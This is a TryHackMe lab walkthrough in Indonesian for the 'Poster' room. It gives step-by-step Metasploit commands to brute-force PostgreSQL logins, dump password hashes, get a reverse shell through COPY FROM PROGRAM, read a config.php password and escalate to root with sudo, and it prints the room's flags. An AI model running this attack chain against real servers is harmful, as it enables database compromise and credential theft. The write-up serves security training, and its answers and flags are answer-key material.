# Poster
- TryHackMe Room: https://tryhackme.com/room/poster
- IP Machine: 10.10.230.31

## Task 1 - Flag

- **Pertanyaan:** What is the rdbms installed on the server?
- Lakukan port scanning dengan tool `nmap`
```sh
nmap -sC -sV <IP_Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%201.JPG)

- **Jawaban:**
```sh
postgresql
```

- **Pertanyaan:** What port is the rdbms running on?
- Lihat kembali nmap dari pertanyaan sebelumnya

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%202.JPG)

- **Jawaban:**
```sh
5432
```

- **Pertanyaan:** After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
- Buka `msfconsole` di terminal
```sh
sudo msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%203.JPG)

- Lalu cari modul untuk postgre SQL
```sh
search postgres
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%204.JPG)

- Disini kita menemukan modul PostgreSQL Login Utility

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%205.JPG)

- **Jawaban:**
```sh
auxiliary/scanner/postgres/postgres_login
```

- **Pertanyaan:** What are the credentials you found?
- Gunakan modul `auxiliary/scanner/postgres/postgres_login` yang berada di nomor 9 dan isi parameter rhost dengan IP Machine melalui perintah `set rhost <IP_Machine>`
```sh
use auxiliary/scanner/postgres/postgres_login
set rhost <IP_Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%206.JPG)

- Jalankan exploit dan tunggu hingga proses selesai
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%207.JPG)

- Disini kita berhasil mendapatkan 1 pasangan username dan password

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%208.JPG)

- **Jawaban:**
```sh
postgres:password
```

- **Pertanyaan:** What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
- Cari kembali modul untuk postgre SQL
```sh
search postgres
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%209.JPG)

- Disini kita menemukan modul PostgreSQL Server Generic Query di nomor 11

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2010.JPG)

- Untuk melihat informasi detail modul ketik `info nomor_modul`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2011.JPG)

- **Jawaban:**
```sh
auxiliary/admin/postgres/postgres_sql
```

- **Pertanyaan:** Based on the results of #6, what is the rdbms version installed on the server?
- Gunakan modul `auxiliary/admin/postgres/postgres_sql` yang berada di nomor 11 dan isi parameter rhost dengan IP Machine dan password user yang sudah ditemukan
```sh
use auxiliary/admin/postgres/postgres_sql
set rhost <IP_Machine>
set password password
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2012.JPG)

- Jalankan exploit dan tunggu hingga proses selesai. Disini kita berhasil mendapat versi postgre SQL yang terinstall di server
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2013.JPG)

- **Jawaban:**
```sh
9.5.21
```

- **Pertanyaan:** What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
- Cari kembali modul untuk postgre SQL
```sh
search postgres
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2014.JPG)

- Disini kita menemukan modul Postgres Password Hashdump di nomor 15

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2015.JPG)

- **Jawaban:**
```sh
auxiliary/scanner/postgres/postgres_hashdump
```

- **Pertanyaan:** How many user hashes does the module dump?
- Gunakan modul `auxiliary/admin/postgres/postgres_sql` yang berada di nomor 15 dan lihat daftar parameter yang diperlukan
```sh
use auxiliary/scanner/postgres/postgres_hashdump
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2016.JPG)

- Disini kita hanya perlu mengisi parameter rhost dan password
```sh
set rhost <IP_Machine>
set password password
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2017.JPG)

- Jalankan exploit dan tunggu hingga proses selesai. Disini kita berhasil mendapatkan 6 daftar username dan hash
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2018.JPG)

- **Jawaban:**
```sh
6
```

- **Pertanyaan:** What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
- Cari kembali modul untuk postgre SQL
```sh
search postgres
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2019.JPG)

- Disini kita menemukan modul PostgreSQL Server Generic Query untuk membaca file di server pada nomor 10

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2020.JPG)

- **Jawaban:**
```sh
auxiliary/admin/postgres/postgres_readfile
```

- **Pertanyaan:** What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?
- Dari hasil pencarian di pertanyaan sebelumnya, kita juga menemukan modul PostgreSQL COPY FROM PROGRAM Command Execution di nomor 6

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2021.JPG)

- **Jawaban:**
```sh
exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

- **Pertanyaan:** Compromise the machine and locate user.txt
- Gunakan modul `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` yang berada di nomor 6 dan lihat daftar parameter yang diperlukan
```sh
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2022.JPG)

- Parameter yang harus diisi adalah rhost, password dan lhost
```sh
set rhost <IP_Machine>
set password password
set lhost <IP_tun0>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2023.JPG)

- Jalankan exploit dan tunggu beberapa saat hingga terhubung dengan server
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2024.JPG)

- Buat shell menjadi terminal interaktif dengan python3
```sh
python3 -c "import pty; pty.spawn('/bin/bash')"
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2025.JPG)

- Di dalam folder home terdapat folder alison dan didalam folder alison terdapat file **user.txt**. Tapi sayangnya kita tidak diberi akses untuk membaca file **user.txt** tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2026.JPG)

- Pindah ke directory **/var/www/html** dan disana terdapat file **config.php** yang diduga berisi password untuk masuk sebagai alison
```sh
cd /var/www/html
cat config.php
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2027.JPG)

- Sekarang kita coba masuk sebagai alison dengan memanfaatkan password diatas
```sh
su alison
p4ssw0rdS3cur3!#
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2028.JPG)

- Kita berhasil masuk sebagai alison, sekarang kita buka isi file **user.txt**
```sh
cat /home/alison/user.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2029.JPG)

- **Jawaban:**
```sh
THM{postgresql_fa1l_conf1gurat1on}
```

- **Pertanyaan:** Escalate privileges and obtain root.txt
- Lakukan pengecekan apakah user `alison` punya akses ke sudo. Disini tertulis **ALL : ALL** artinya alison dapat mengakses user root tanpa password
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2030.JPG)

- Masuk ke user root
```sh
sudo su
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2031.JPG)

- Buka root flag yang berada di direktori **/root**
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Poster/assets/p%2032.JPG)

- **Jawaban:**
```sh
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```